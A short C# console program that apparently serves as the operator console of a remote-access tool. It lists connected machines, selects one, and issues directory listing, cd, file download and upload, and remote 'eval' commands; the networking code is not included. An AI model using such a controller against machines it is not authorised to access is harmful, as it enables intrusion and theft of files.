using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Server
{
    class Program
    {
        static void Main(string[] args)
        {
            Server server  = new Server();
            string s = Console.ReadLine();
            Pc activePc = null;
            while (s != "exit")
            {
                string[] CommAndArgs = s.Split(' ');
                string com = CommAndArgs[0];
                string argz = string.Empty;
                Console.Write("({0})>", activePc?.id);
                for (int i = 1; i < CommAndArgs.Length; i++)
                {
                    argz += CommAndArgs[i] + " ";
                }
                if (argz.Length>0)
                    argz = argz.Remove(argz.Length - 1);
                switch (CommAndArgs[0].ToLower())
                {
                    case "dir":
                        try
                        {
                            if (argz != string.Empty)
                                activePc.DIR(argz);
                            else
                                activePc.DIR();
                        }
                        catch(Exception ex) {
                            Console.WriteLine(ex);
                        }
                        break;
                    case "sel":
                        try
                        {
                            activePc = server.GimePc(Convert.ToInt32(argz));
                        }catch(Exception ex)
                        {
                            Console.WriteLine(ex);
                        }
                        break;
                    case "list":
                        Console.WriteLine(server.ListUsers());
                        break;
                    case "cd":
                        try
                        {
                            activePc.CD(argz);
                        }catch(Exception exx)
                        {
                            Console.WriteLine(exx);
                        }
                        break;
                    case "down":
                        try
                        {
                            activePc.GetFile(argz);
                        }catch(Exception ex)
                        {
                            Console.WriteLine(ex);
                        }
                        break;
                    case "up":
                        try
                        {
                            activePc.PushFile(argz);
                        }catch(Exception ex)
                        {
                            Console.WriteLine(ex);
                        }
                        break;
                    case "eval":
                        try
                        {
                            activePc.Eval(argz);
                        }catch(Exception ex)
                        {
                            Console.WriteLine(ex);
                        }
                        break;
                }
                s = Console.ReadLine();
            }
        }
    }
}
